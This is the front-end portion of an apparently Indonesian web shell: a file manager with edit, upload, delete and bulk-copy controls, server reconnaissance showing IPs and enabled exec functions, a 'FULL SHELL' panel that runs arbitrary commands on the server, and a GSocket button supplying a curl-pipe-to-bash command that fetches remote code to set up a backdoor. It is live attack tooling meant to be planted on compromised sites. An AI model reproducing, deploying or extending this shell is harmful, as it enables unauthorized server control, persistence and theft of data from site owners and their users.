                                    class="pill-btn pill-btn-ghost text-xs btn-new flex items-center space-x-1">
                                    <img src="https://cdn-icons-png.flaticon.com/128/3735/3735045.png" alt="New" class="w-4 h-4">
                                    <span>New File/Folder</span>
                                </button>
                                <button type="button"
                                    class="pill-btn pill-btn-ghost text-xs btn-bulkcopy flex items-center space-x-1">
                                    <span>📦</span><span>Bulk Copy</span>
                                </button>
                                <button type="button"
                                    class="pill-btn pill-btn-ghost text-xs btn-gsocket flex items-center space-x-1">
                                    <span>⚡</span><span>GSocket</span>
                                </button>
                            </div>
                        </div>
                    </div>

                    <!-- BREADCRUMB -->
                    <nav class="glass-card px-4 py-3">
                        <div class="flex items-center justify-between text-[11px]">
                            <div class="flex items-center space-x-2">
                                <span class="text-slate-200">Path</span>
                                <div class="text-white" id="breadcrumb">
                                    <?= breadcrumb_html($currentDir) ?>
                                </div>
                            </div>
                            <div class="hidden sm:flex items-center space-x-2 text-[10px] text-slate-200">
                                <span>Home dir :</span>
                                <span class="text-sky-200 font-mono truncate max-w-[200px]"><?= htmlspecialchars($USER_HOME) ?></span>
                            </div>
                        </div>
                    </nav>

                    <!-- FILE LIST -->
                    <div class="glass-card p-4 text-white">
                        <?php if(is_locked_path($currentDir,$locks)): ?>
                            <div class="mb-3 text-xs bg-yellow-500 bg-opacity-10 border border-yellow-400 text-yellow-100 px-3 py-2 rounded">
                                ⚠ Direktori ini LOCK, aksi write/delete ditolak.
                            </div>
                        <?php endif; ?>
                        <!-- GRID: sampai 6 kolom di layar gede -->
                        <div id="file-grid" class="grid gap-3 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-6">
                            <?php render_file_cards($currentDir,$locks); ?>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- SIDEBAR: SYSTEM INFO + DIAGNOSTIC -->
        <aside class="w-full lg:w-72 space-y-4 mt-4 lg:mt-0">

            <!-- SYSTEM INFO -->
            <div class="glass-card p-4 text-white">
                <div class="flex items-center justify-between mb-3">
                    <h2 class="text-xs font-semibold tracking-wide uppercase">SYSTEM INFO</h2>
                    <span class="text-[10px] px-2 py-0.5 rounded-full bg-slate-800 text-slate-200 border border-slate-700">
                        SERVER
                    </span>
                </div>
                <dl class="space-y-2 text-xs">
                    <div class="flex justify-between"><dt class="text-slate-200">Server IP</dt><dd class="text-white"><?= htmlspecialchars($serverIp) ?></dd></div>
                    <div class="flex justify-between"><dt class="text-slate-200">Your IP</dt><dd class="text-white"><?= htmlspecialchars($clientIp) ?></dd></div>
                    <div class="flex justify-between"><dt class="text-slate-200">Server</dt><dd class="text-white truncate text-right"><?= htmlspecialchars($serverSoftware) ?></dd></div>
                    <div class="flex justify-between"><dt class="text-slate-200">System</dt><dd class="text-white truncate text-right"><?= htmlspecialchars($osVersion) ?></dd></div>
                    <div class="flex justify-between"><dt class="text-slate-200">User</dt><dd class="text-white"><?= htmlspecialchars($currentUser) ?></dd></div>
                    <div class="flex justify-between"><dt class="text-slate-200">PHP</dt><dd class="text-sky-200 font-semibold"><?= htmlspecialchars($phpVersion) ?></dd></div>
                </dl>

                <div class="mt-4 pt-3 border-t border-slate-700">
                    <div class="text-[10px] text-slate-300 mb-1">Exec Functions</div>
                    <div class="space-y-1 text-[11px]">
                        <div class="flex justify-between"><span>exec()</span><span class="font-mono <?= $execStatus==='Disabled'?'text-red-300':'text-emerald-300' ?>"><?= htmlspecialchars($execStatus) ?></span></div>
                        <div class="flex justify-between"><span>shell_exec()</span><span class="font-mono <?= $shellExecStatus==='Disabled'?'text-red-300':'text-emerald-300' ?>"><?= htmlspecialchars($shellExecStatus) ?></span></div>
                        <div class="flex justify-between"><span>popen()</span><span class="font-mono <?= $popenStatus==='Disabled'?'text-red-300':'text-emerald-300' ?>"><?= htmlspecialchars($popenStatus) ?></span></div>
                        <div class="flex justify-between"><span>proc_open()</span><span class="font-mono <?= $procOpenStatus==='Disabled'?'text-red-300':'text-emerald-300' ?>"><?= htmlspecialchars($procOpenStatus) ?></span></div>
                    </div>
                </div>

                <div class="mt-3">
                    <div class="text-[10px] text-slate-300 mb-1">PHPMailer</div>
                    <div class="flex justify-between text-[11px]">
                        <span>Class</span>
                        <span class="font-mono <?= $phpmailerStatus==='Found'?'text-emerald-300':'text-red-300' ?>"><?= htmlspecialchars($phpmailerStatus) ?></span>
                    </div>
                </div>

                <div class="mt-4">
                    <div class="flex justify-between text-[10px] text-slate-200 mb-1">
                        <span>Disk Usage</span>
                        <span><?= fmt_bytes($diskUsed) ?> / <?= fmt_bytes($diskTotal) ?></span>
                    </div>
                    <div class="w-full h-2 rounded-full bg-slate-900 overflow-hidden">
                        <div class="h-full bg-gradient-to-r from-sky-400 via-indigo-500 to-amber-400" style="width:<?= max(0,min(100,$diskPct)) ?>%;"></div>
                    </div>
                    <div class="mt-1 text-[10px] text-slate-200 flex justify-between">
                        <span>Used: <?= $diskPct ?>%</span>
                        <span>Free: <?= fmt_bytes($diskFree) ?></span>
                    </div>
                </div>
            </div>

            <!-- DIAGNOSTIC PANEL (FULL SHELL) -->
            <div class="glass-card p-4 text-white">
                <div class="flex items-center justify-between mb-3">
                    <h2 class="text-xs font-semibold tracking-wide uppercase">Diagnostics</h2>
                    <span class="text-[10px] px-2 py-0.5 rounded-full bg-slate-800 text-slate-200 border border-slate-700">
                        FULL SHELL
                    </span>
                </div>
                <div class="space-y-2 text-[11px]">
                    <label class="block text-slate-200 mb-1">Command</label>
                    <input id="diag-input" type="text"
                        class="w-full bg-slate-900 border border-slate-700 rounded px-2 py-1 text-[11px]"
                        placeholder="contoh: ls -la /home">
                    <button id="diag-run" type="button" class="pill-btn pill-btn-primary text-[11px] mt-1 w-full">
                        Run Command
                    </button>
                    <div class="mt-2 text-[10px] text-slate-300">
                        Command akan dijalankan langsung di shell server. Hati-hati.
                    </div>
                    <pre id="diag-output" class="mt-2 bg-slate-900 border border-slate-800 rounded p-2 text-[10px] text-slate-100 overflow-auto max-h-48 whitespace-pre-wrap">
&gt; (belum ada output)
                    </pre>
                </div>
            </div>

        </aside>
    </div>
</main>
</div>

<!-- hidden YT -->
<div id="yt-player"></div>

<!-- MODAL -->
<div id="modal-backdrop" class="modal-backdrop">
    <div class="glass-card w-full max-w-xl mx-4">
        <div class="flex items-center justify-between px-4 pt-4 pb-2 border-b border-slate-700">
            <h3 id="modal-title" class="text-sm font-semibold text-white">Modal</h3>
            <button type="button" id="modal-close" class="text-slate-300 hover:text-white text-lg leading-none">×</button>
        </div>
        <form id="modal-form" class="px-4 pt-3 pb-4 space-y-3 text-xs">
            <div id="modal-message" class="hidden text-[11px]"></div>
            <div id="modal-body"></div>
            <div class="flex items-center justify-end space-x-2 pt-2">
                <button type="button" id="modal-cancel" class="pill-btn pill-btn-ghost text-xs">Batal</button>
                <button type="submit" id="modal-submit" class="pill-btn pill-btn-primary text-xs">Save</button>
            </div>
        </form>
    </div>
</div>

<script src="https://www.youtube.com/iframe_api"></script>
<script>
(function(){
    const modalBackdrop=document.getElementById('modal-backdrop');
    const modalTitle=document.getElementById('modal-title');
    const modalBody=document.getElementById('modal-body');
    const modalForm=document.getElementById('modal-form');
    const modalSubmit=document.getElementById('modal-submit');
    const modalMessage=document.getElementById('modal-message');
    const btnClose=document.getElementById('modal-close');
    const btnCancel=document.getElementById('modal-cancel');
    const fileGrid=document.getElementById('file-grid');
    const pathLabel=document.getElementById('current-path-label');
    const breadcrumbEl=document.getElementById('breadcrumb');

    const musicTitle=document.getElementById('music-title');
    const musicSubtitle=document.getElementById('music-subtitle');
    const musicPrev=document.getElementById('music-prev');
    const musicPlayBtn=document.getElementById('music-play');
    const musicPlayIcon=document.getElementById('music-play-icon');
    const musicNext=document.getElementById('music-next');
    const musicTimeStart=document.getElementById('music-time-start');
    const musicTimeEnd=document.getElementById('music-time-end');
    const musicProgress=document.getElementById('music-progress');
    const playlistEl=document.getElementById('playlist');

    const diagInput=document.getElementById('diag-input');
    const diagRun=document.getElementById('diag-run');
    const diagOutput=document.getElementById('diag-output');

    let currentDir=<?= json_encode($currentDir) ?>;
    let modalHandler=null;

    // playlist
    const garudaPlaylist=[
        {title:"Cup of Joe - Multo",id:"LcYcvN3PDJw"},
        {title:"NIKI - You'll Be in My Heart",id:"Bl0Gtp5FMd4"},
        {title:"Wave to Earth - Love.",id:"QX2dqXr8mOU"},
        {title:"The 1975 - About You",id:"tGv7CUutzqU"},
        {title:"wave to earth - seasons",id:"CnVVjLOGVoY"},
        {title:"Arctic Monkeys - No. 1 Party Anthem",id:"zjZD-ibfhnU"},
        {title:"Mitski - My Love Mine All Mine",id:"CwGbMYLjIpQ"},
    ];
    let garudaPlayer=null, garudaIndex=0, garudaIsPlaying=false, garudaDuration=0, garudaTimer=null;

    function escapeHtml(str){
        return String(str).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#039;");
    }function formatTime(sec){
        sec=Math.floor(sec||0);
        const m=Math.floor(sec/60), s=sec%60;
        return String(m).padStart(2,"0")+":"+String(s).padStart(2,"0");
    }
    function updateMusicUIPlaying(isPlay){
        garudaIsPlaying=!!isPlay;
        if(musicPlayIcon){
            musicPlayIcon.src = isPlay
                ? "https://cdn-icons-png.flaticon.com/512/6878/6878704.png"
                : "https://cdn-icons-png.flaticon.com/512/6878/6878705.png";
        }
        if(musicSubtitle) musicSubtitle.textContent=isPlay?'NOW PLAYING':'PAUSED';
    }
    function clearTimer(){
        if(garudaTimer){clearInterval(garudaTimer);garudaTimer=null;}
    }
    function startTimer(){
        clearTimer();
        garudaTimer=setInterval(()=>{
            if(!garudaPlayer) return;
            try{
                const cur=garudaPlayer.getCurrentTime()||0;
                const dur=garudaPlayer.getDuration()||garudaDuration||0;
                garudaDuration=dur;
                if(musicTimeStart) musicTimeStart.textContent=formatTime(cur);
                if(musicTimeEnd) musicTimeEnd.textContent=dur?formatTime(dur):"00:00";
                if(musicProgress && dur>0){
                    const pct=Math.max(0,Math.min(100,cur/dur*100));
                    musicProgress.style.width=pct+"%";
                }
            }catch(e){}
        },1000);
    }
    function renderPlaylist(){
        if(!playlistEl) return;
        playlistEl.innerHTML="";
        garudaPlaylist.forEach((t,idx)=>{
            const row=document.createElement("div");
            row.className="playlist-row "+(idx===garudaIndex?"active":"inactive");
            row.dataset.index=idx;
            row.innerHTML='<div class="idx">'+(idx+1)+'</div>'
                +'<div class="icon">🎧</div>'
                +'<div class="title">'+escapeHtml(t.title)+'</div>';
            row.onclick=()=> playIndex(idx);
            playlistEl.appendChild(row);
        });
    }
    function highlightPlaylist(){
        if(!playlistEl) return;
        playlistEl.querySelectorAll(".playlist-row").forEach(row=>{
            const idx=parseInt(row.dataset.index,10);
            row.classList.toggle("active",idx===garudaIndex);
            row.classList.toggle("inactive",idx!==garudaIndex);
        });
    }
    function updateTitle(){
        if(musicTitle) musicTitle.textContent=garudaPlaylist[garudaIndex].title;
    }
    function playIndex(idx){
        garudaIndex=(idx+garudaPlaylist.length)%garudaPlaylist.length;
        if(garudaPlayer){
            garudaPlayer.loadVideoById(garudaPlaylist[garudaIndex].id);
            updateTitle();
            highlightPlaylist();
            updateMusicUIPlaying(true);
            startTimer();
        }
    }
    function nextTrack(){playIndex(garudaIndex+1);}
    function prevTrack(){playIndex(garudaIndex-1);}
    function togglePlay(){
        if(!garudaPlayer) return;
        const st=garudaPlayer.getPlayerState();
        if(st===YT.PlayerState.PLAYING){
            garudaPlayer.pauseVideo();
            updateMusicUIPlaying(false);
            clearTimer();
        }else{
            garudaPlayer.playVideo();
            updateMusicUIPlaying(true);
            startTimer();
        }
    }
    window.onYouTubeIframeAPIReady=function(){
        garudaPlayer=new YT.Player('yt-player',{
            videoId:garudaPlaylist[0].id,
            playerVars:{autoplay:1,controls:0,rel:0,modestbranding:1},
            events:{
                onReady:(e)=>{
                    renderPlaylist();
                    updateTitle();
                    musicSubtitle.textContent="NOW PLAYING";
                    startTimer();
                    try{e.target.playVideo();}catch(err){}
                },
                onStateChange:(e)=>{
                    if(e.data===YT.PlayerState.ENDED){
                        nextTrack();
                    }else if(e.data===YT.PlayerState.PLAYING){
                        updateMusicUIPlaying(true);startTimer();
                    }else if(e.data===YT.PlayerState.PAUSED){
                        updateMusicUIPlaying(false);clearTimer();
                    }
                }
            }
        });
    };

    if(musicPrev) musicPrev.addEventListener("click",prevTrack);
    if(musicNext) musicNext.addEventListener("click",nextTrack);
    if(musicPlayBtn) musicPlayBtn.addEventListener("click",togglePlay);

    // ========== MODAL ==========
    function showModal(title,bodyHTML,submitText,handler){
        modalTitle.textContent=title;
        modalBody.innerHTML=bodyHTML;
        modalSubmit.textContent=submitText||'Save';
        modalMessage.classList.add('hidden');
        modalMessage.textContent='';
        modalHandler=handler||null;
        modalBackdrop.classList.add('show');
    }
    function hideModal(){
        modalBackdrop.classList.remove('show');
        modalHandler=null;
    }
    btnClose.addEventListener('click',hideModal);
    btnCancel.addEventListener('click',hideModal);
    modalBackdrop.addEventListener('click',e=>{if(e.target===modalBackdrop)hideModal();});
    modalForm.addEventListener('submit',e=>{
        e.preventDefault();
        if(!modalHandler) return;
        const fd=new FormData(modalForm);
        modalHandler(fd);
    });
    function showError(msg){
        modalMessage.className='text-[11px] text-red-200 bg-red-900 bg-opacity-40 border border-red-500 px-3 py-2 rounded';
        modalMessage.textContent=msg;
        modalMessage.classList.remove('hidden');
    }
    function showSuccess(msg){
        modalMessage.className='text-[11px] text-emerald-200 bg-emerald-900 bg-opacity-40 border border-emerald-500 px-3 py-2 rounded';
        modalMessage.textContent=msg;
        modalMessage.classList.remove('hidden');
    }

    function refreshFileList(){
        fetch('?ajax=filelist&dir='+encodeURIComponent(currentDir))
            .then(r=>r.text()).then(html=>{
                fileGrid.innerHTML=html;
                attachFileButtons();
            });
    }
    function refreshBreadcrumb(){
        fetch('?ajax=breadcrumb&dir='+encodeURIComponent(currentDir))
            .then(r=>r.text()).then(html=>{
                breadcrumbEl.innerHTML=html;
                attachBreadcrumb();
            });
    }
    function changeDir(dir){
        fetch('?ajax=changedir&dir='+encodeURIComponent(dir))
            .then(r=>r.json()).then(data=>{
                if(!data.ok){alert(data.error||'Direktori tidak valid');return;}
                currentDir=data.dir;
                pathLabel.textContent=currentDir;
                refreshFileList();
                refreshBreadcrumb();
                window.history.replaceState(null,'','?dir='+encodeURIComponent(currentDir));
            });
    }

    function attachFileButtons(){
        document.querySelectorAll('.link-open-dir').forEach(btn=>{
            btn.onclick=()=>changeDir(btn.getAttribute('data-dir'));
        });
        document.querySelectorAll('.btn-edit').forEach(btn=>{
            btn.onclick=()=>openEditModal(btn.getAttribute('data-file'));
        });
        document.querySelectorAll('.btn-lock').forEach(btn=>{
            btn.onclick=()=>{
                const target=btn.getAttribute('data-target');
                if(!confirm('LOCK "'+target+'"?'))return;
                const fd=new FormData();
                fd.append('ajax','lock');
                fd.append('target',target);
                fetch('?ajax=lock&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                    .then(r=>r.json()).then(d=>{
                        if(!d.ok){alert(d.error||'Gagal lock');return;}
                        refreshFileList();
                    });
            };
        });
        document.querySelectorAll('.btn-unlock').forEach(btn=>{
            btn.onclick=()=>openUnlockModal(btn.getAttribute('data-target'));
        });
        document.querySelectorAll('.btn-delete').forEach(btn=>{
            btn.onclick=()=>{
                const t=btn.getAttribute('data-target');
                if(!confirm('Yakin hapus "'+t+'"?'))return;
                const fd=new FormData();
                fd.append('ajax','delete');
                fd.append('target',t);
                fetch('?ajax=delete&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                    .then(r=>r.json()).then(d=>{
                        if(!d.ok){alert(d.error||'Gagal delete');return;}
                        refreshFileList();
                    });
            };
        });
    }
    function attachBreadcrumb(){
        breadcrumbEl.querySelectorAll('.bc-root,.bc-part').forEach(el=>{
            el.addEventListener('click',()=>changeDir(el.getAttribute('data-dir')));
        });
    }

    function openEditModal(file){
        fetch('?ajax=loadfile&dir='+encodeURIComponent(currentDir)+'&file='+encodeURIComponent(file))
            .then(r=>r.json()).then(d=>{
                if(!d.ok){alert(d.error||'Gagal load file');return;}
                const bodyHTML='<input type="hidden" name="file" value="'+escapeHtml(file)+'">'
                    +'<label class="block mb-1 text-slate-200">Edit: '+escapeHtml(file)+'</label>'
                    +'<textarea name="content" rows="18" class="w-full border border-slate-700 bg-slate-900 rounded p-2 font-mono text-[11px]">'+escapeHtml(d.content)+'</textarea>';
                showModal('Edit File',bodyHTML,'Simpan',fd=>{
                    fd.append('ajax','savefile');
                    fetch('?ajax=savefile&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                        .then(r=>r.json()).then(res=>{
                            if(!res.ok){showError(res.error||'Gagal simpan');return;}
                            showSuccess(res.message||'Tersimpan');
                            refreshFileList();
                        });
                });
            });
    }
    function openUnlockModal(target){
        const bodyHTML='<input type="hidden" name="target" value="'+escapeHtml(target)+'">'
            +'<label class="block mb-1 text-slate-200">Unlock: '+escapeHtml(target)+'</label>'
            +'<input type="password" name="key" class="w-full border border-slate-700 rounded bg-slate-900 p-2 text-xs" placeholder="Masukin unlock key..." required>';
        showModal('Unlock',bodyHTML,'Unlock',fd=>{
            fd.append('ajax','unlock');
            fetch('?ajax=unlock&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                .then(r=>r.json()).then(res=>{
                    if(!res.ok){showError(res.error||'Gagal unlock');return;}
                    showSuccess(res.message||'Unlocked');
                    refreshFileList();
                });
        });
    }
    function openNewModal(){
        const bodyHTML='<label class="block mb-1 text-slate-200">Tipe:</label>'
            +'<select name="type" class="w-full border border-slate-700 bg-slate-900 rounded p-2 text-xs mb-2"><option value="file">File</option><option value="folder">Folder</option></select>'
            +'<label class="block mb-1 text-slate-200">Nama:</label>'
            +'<input type="text" name="name" class="w-full border border-slate-700 rounded bg-slate-900 p-2 text-xs mb-2" required>'
            +'<div id="new-content-wrapper">'
            +'<label class="block mb-1 text-slate-200">Content (optional):</label>'
            +'<textarea name="content" rows="6" class="w-full border border-slate-700 bg-slate-900 rounded p-2 font-mono text-[11px]"></textarea>'
            +'</div>';
        showModal('Buat File / Folder',bodyHTML,'Buat',fd=>{
            fd.append('ajax','newitem');
            fetch('?ajax=newitem&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                .then(r=>r.json()).then(res=>{
                    if(!res.ok){showError(res.error||'Gagal membuat');return;}
                    showSuccess(res.message||'Berhasil');
                    refreshFileList();
                });
        });
        setTimeout(()=>{
            const sel=modalBody.querySelector('select[name="type"]');
            const wrap=modalBody.querySelector('#new-content-wrapper');
            const toggle=()=>{wrap.style.display=(sel.value==='file')?'block':'none';};
            sel.addEventListener('change',toggle);toggle();
        },50);
    }
    function openUploadModal(){
        const bodyHTML='<label class="block mb-1 text-slate-200">File:</label>'
            +'<input type="file" name="upload_file" class="w-full border border-slate-700 rounded bg-slate-900 p-2 text-xs" required>';
        showModal('Upload File',bodyHTML,'Upload',fd=>{
            fd.append('ajax','upload');
            fetch('?ajax=upload&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                .then(r=>r.json()).then(res=>{
                    if(!res.ok){showError(res.error||'Gagal upload');return;}
                    showSuccess(res.message||'Upload sukses');
                    refreshFileList();
                });
        });
    }
    function openBulkCopyModal(){
        const bodyHTML='<label class="block mb-1 text-slate-200">Target Folder:</label>'
            +'<input type="text" name="target" class="w-full border border-slate-700 rounded bg-slate-900 p-2 text-xs mb-2" required>'
            +'<label class="block mb-1 text-slate-200">Path tujuan:</label>'
            +'<input type="text" name="destpath" class="w-full border border-slate-700 rounded bg-slate-900 p-2 text-xs mb-2" required>'
            +'<label class="block mb-1 text-slate-200">Nama folder baru (comma / newline):</label>'
            +'<textarea name="names" rows="4" class="w-full border border-slate-700 rounded bg-slate-900 p-2 text-xs" required></textarea>';
        showModal('Bulk Copy Folder',bodyHTML,'Run',fd=>{
            fd.append('ajax','bulkcopy');
            fetch('?ajax=bulkcopy&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                .then(r=>r.json()).then(res=>{
                    if(!res.ok){showError(res.error||'Gagal bulk copy');return;}
                    showSuccess(res.message||'Bulk copy sukses');
                    refreshFileList();
                });
        });
    }

    // GSOCKET MODAL (command only)
    function openGsocketModal(){
        fetch('?ajax=gsocket_cmd')
            .then(r=>r.json()).then(d=>{
                if(!d.ok){alert('Gagal ambil command');return;}
                const cmd=d.cmd||'bash -c "$(curl -fsSL https://gsocket.io/y)"';
                const bodyHTML='<div class="text-[11px] text-slate-200 mb-2">'
                    +'Command ini <b>tidak dijalankan otomatis</b>. Copy & jalankan sendiri di terminal / WSL / cmd:</div>'
                    +'<div class="bg-slate-900 border border-slate-700 rounded p-2 font-mono text-[11px] text-sky-200 break-all" id="gs-cmd">'
                    +escapeHtml(cmd)+'</div>'
                    +'<button type="button" id="btn-copy-gs" class="mt-2 pill-btn pill-btn-primary text-xs">Copy Command</button>';
                showModal('GSocket Command',bodyHTML,'Close',()=>{hideModal();});
                setTimeout(()=>{
                    const b=document.getElementById('btn-copy-gs');
                    b && (b.onclick=function(){
                        const tx=document.getElementById('gs-cmd').innerText;
                        navigator.clipboard.writeText(tx).then(()=>{showSuccess('Copied to clipboard');});
                    });
                },30);
            });
    }

    document.querySelector('.btn-new').addEventListener('click',openNewModal);
    document.querySelector('.btn-upload').addEventListener('click',openUploadModal);
    document.querySelector('.btn-bulkcopy').addEventListener('click',openBulkCopyModal);
    document.querySelector('.btn-gsocket').addEventListener('click',openGsocketModal);

    attachFileButtons();
    attachBreadcrumb();

    // DIAGNOSTIC PANEL JS (FULL SHELL)
    if(diagRun){
        diagRun.addEventListener('click',function(){
            const cmd=(diagInput.value||'').trim();
            if(!cmd){alert('Command kosong');return;}
            const fd=new FormData();
            fd.append('ajax','diag');
            fd.append('cmd',cmd);
            diagOutput.textContent="> Running "+cmd+" ...";
            fetch('?ajax=diag&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                .then(r=>r.json()).then(res=>{
                    if(!res.ok){
                        diagOutput.textContent="ERROR: "+(res.error||'Gagal jalanin command');
                        return;
                    }
                    diagOutput.textContent="> "+(res.cmd||cmd)+"\n\n"+(res.output||'(no output)');
                }).catch(err=>{
                    diagOutput.textContent="ERROR: "+err;
                });
        });
    }
})();
</script>
</body>
</html>
